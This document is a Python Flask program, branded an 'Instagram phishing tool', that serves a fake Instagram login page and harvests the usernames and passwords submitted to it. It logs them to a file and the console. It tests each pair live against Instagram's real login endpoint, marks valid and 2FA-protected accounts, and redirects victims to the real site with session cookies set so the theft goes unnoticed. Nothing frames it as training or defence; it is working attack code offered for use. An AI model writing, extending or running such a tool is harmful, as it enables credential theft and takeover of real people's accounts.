from flask import Flask, request, redirect, render_template, Response, make_response
import requests
import threading
import time
import os
import signal
import sys
import json
import socket
from urllib.parse import unquote
from bs4 import BeautifulSoup

app = Flask(__name__)

# Global variables to store credentials
credentials = []
lock = threading.Lock()

# NEW: Banner Function
def banner():
    os.system('clear')
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║      ██╗  ██╗ ██████╗ ███╗   ██╗███████╗ █████╗ ████████╗    ║
    ║      ██║  ██║██╔═══██╗████╗  ██║██╔════╝██╔══██╗╚══██╔══╝    ║
    ║      ███████║██║   ██║██╔██╗ ██║█████╗  ███████║   ██║       ║
    ║      ██╔══██║██║   ██║██║╚██╗██║██╔══╝  ██╔══██║   ██║       ║
    ║      ██║  ██║╚██████╔╝██║ ╚████║███████╗██║  ██║   ██║       ║
    ║      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ╚═╝       ║
    ║                                                              ║
    ║                     ──────────────────────                   ║
    ║                     INSTAGRAM PHISHING TOOL                  ║
    ║                     ──────────────────────                   ║
    ║                                                              ║
    ║          [+] Coded By: CyberHunt                             ║
    ║          [+] Version: 1.0                                    ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

# NEW: Status Display Function
def print_status(message, status_type="info"):
    timestamp = time.strftime("%H:%M:%S")
    if status_type == "success":
        print(f"\033[92m[{timestamp}] [+] SUCCESS: {message}\033[0m")
    elif status_type == "error":
        print(f"\033[91m[{timestamp}] [-] ERROR: {message}\033[0m")
    elif status_type == "warning":
        print(f"\033[93m[{timestamp}] [!] WARNING: {message}\033[0m")
    elif status_type == "info":
        print(f"\033[96m[{timestamp}] [*] INFO: {message}\033[0m")
    else:
        print(f"[{timestamp}] {message}")

# NEW: Function to save credentials to a file
def save_to_file(data):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open('captured_credentials.txt', 'a') as f:
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"Username: {data['username']}\n")
        f.write(f"Password: {data['password']}\n")
        f.write(f"Status: {data['status']}\n")
        f.write(f"Details: {data['details']}\n")
        f.write("="*50 + "\n")

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Store credentials in memory
    with lock:
        credentials.append({'username': username, 'password': password, 'timestamp': time.time()})
    
    print_status(f"New login attempt for username: {username}", "info")
    
    # Check if credentials are valid
    is_valid, session_info, login_status = check_credentials(username, password)

    # Determine status and details for saving to file
    status = "Invalid"
    details = "Username or password is incorrect."
    
    if is_valid:
        if login_status == "2FA_Required":
            status = "Valid (2FA Required)"
            details = "Credentials are correct, but a security code is needed."
        elif login_status == "Authenticated":
            status = "Valid (Authenticated)"
            details = "Login was successful."
        
        # Save to file
        save_to_file({
            'username': username,
            'password': password,
            'status': status,
            'details': details
        })
        
        print_status(f"Valid credentials found for: {username}", "success")
        print_status(f"Password: {password}", "success")
        
        # Create a response that redirects to Instagram
        response = make_response(redirect('https://www.instagram.com/'))
        
        # If we have session cookies, set them in the user's browser
        if session_info and 'cookies' in session_info:
            for cookie in session_info['cookies']:
                response.set_cookie(cookie['name'], cookie['value'])
        
        return response
    else:
        # Save invalid credentials to file as well
        save_to_file({
            'username': username,
            'password': password,
            'status': status,
            'details': details
        })
        
        print_status(f"Invalid credentials for username: {username}", "error")
        # Show error on fake page
        return render_template('login.html', error=True)

def check_credentials(username, password):
    try:
        # Create a session to persist cookies
        session = requests.Session()
        
        # Set headers to mimic a real browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        session.headers.update(headers)

        # 1. Initial GET request to grab cookies
        response = session.get('https://www.instagram.com/')
        csrf_token = session.cookies.get_dict().get('csrftoken')

        # 2. GET request to the login page to get more dynamic data
        login_page_response = session.get('https://www.instagram.com/accounts/login/')
        
        # Extract required data from the login page
        soup = BeautifulSoup(login_page_response.content, 'html.parser')
        
        # Find the shared data script
        shared_data_script = soup.find('script', string=lambda t: t and 'window._sharedData' in t)
        shared_data = {}
        if shared_data_script:
            # Extract JSON from the script
            json_text = shared_data_script.string.split(' = ')[1].rstrip(';')
            shared_data = json.loads(json_text)

        # Get the rollout hash (required for the X-Instagram-AJAX header)
        rollout_hash = shared_data.get('rollout_hash', 'd7506f1c97a0')

        # 3. Prepare the POST request for login
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        
        # This is the crucial part - the password needs to be encrypted in a specific way
        enc_password = f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}'
        
        login_data = {
            'username': username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletion': 'false',
            'trustedDevice': 'false',
            'trusteSignal': 'false',
        }

        # Update headers for the POST request
        post_headers = {
            'X-CSRFToken': csrf_token,
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': rollout_hash,
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Origin': 'https://www.instagram.com',
        }
        session.headers.update(post_headers)

        # 4. Send the POST request
        response = session.post(login_url, data=login_data)
        
        # 5. Analyze the response
        response_json = response.json()
        
        # Debugging line
        print_status(f"Instagram Response: {response_json.get('status')}", "info")
        
        # Check for success. 'authenticated' is the key.
        if response_json.get('authenticated'):
            # Return True, the session cookies, and the status string
            return True, {'cookies': [{'name': c.name, 'value': c.value} for c in session.cookies]}, "Authenticated"
        
        # NEW: Check for Two-Factor Authentication requirement
        elif response_json.get('two_factor_required'):
            print_status(f"2FA Required for user: {username}. Credentials are valid.", "warning")
            # Since credentials are correct, we can consider this a "success" for our purpose
            # and return True. The session cookies are still valid.
            return True, {'cookies': [{'name': c.name, 'value': c.value} for c in session.cookies]}, "2FA_Required"
        
        # Check for other failures
        else:
            return False, None, "Invalid"

    except Exception as e:
        print_status(f"Error checking credentials: {e}", "error")
        return False, None, "Error"

def display_credentials():
    while True:
        with lock:
            if credentials:
                print("\n" + "="*60)
                print_status("Captured Credentials Log", "info")
                print("="*60)
                for cred in credentials[-5:]:  # Show last 5 credentials
                    print(f"\033[93mUsername: {cred['username']}\033[0m")
                    print(f"\033[93mPassword: {cred['password']}\033[0m")
                    print(f"\033[93mTimestamp: {time.ctime(cred['timestamp'])}\033[0m")
                    print("-" * 60)
        time.sleep(5)

def signal_handler(sig, frame):
    print('\n')
    print_status("Shutting down server...", "warning")
    sys.exit(0)

if __name__ == '__main__':
    # Display the banner first
    banner()
    
    # Start the credentials display thread
    cred_thread = threading.Thread(target=display_credentials)
    cred_thread.daemon = True
    cred_thread.start()
    
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    print_status("Instagram Phishing Tool Started", "success")
    
    # Get the local IP address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "127.0.0.1"
    
    # Display clickable links
    print("="*60)
    print_status("Access the tool using the links below:", "info")
    print(f"   Local:   http://127.0.0.1:8080")
    print(f"   Network: http://{local_ip}:8080")
    print("="*60)
    
    # For most terminals, this will create a clickable link
    print(f"\033]8;;http://127.0.0.1:8080\033\\Click here to open the tool in your browser\033]8;;\033\\")
    
    print_status("Waiting for incoming connections...", "info")
    print_status("Press Ctrl+C to stop the server", "warning")
    print("="*60)
    
    app.run(host='0.0.0.0', port=8080, debug=False)
